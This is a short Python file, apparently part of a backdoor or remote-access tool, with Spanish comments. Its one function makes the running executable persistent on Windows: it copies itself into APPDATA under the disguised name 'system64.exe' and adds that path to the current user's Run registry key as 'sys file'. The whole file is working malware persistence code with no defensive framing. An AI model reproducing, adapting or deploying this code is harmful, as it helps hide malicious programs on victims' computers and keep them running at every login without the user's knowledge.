import sys
import os
import shutil
import winreg

def become_persistent(my_socket):
    #Copy exe in dirs
    #app data
    print("[+] Becoming persistant by adding registry to startup programs")

    curr_executable = sys.executable

    app_data = os.getenv("APPDATA") #Conseguir direccion de appdata\roaming
    to_save_file = app_data +"\\"+"system64.exe"

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_executable, to_save_file)
        
        key = winreg.HKEY_CURRENT_USER #Modificar la llave del usuario que ejecuto el exe

        #\Software\Microsoft\Windows\CurrentVersion\Run

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_obj,"sys file", 0, winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_obj) 
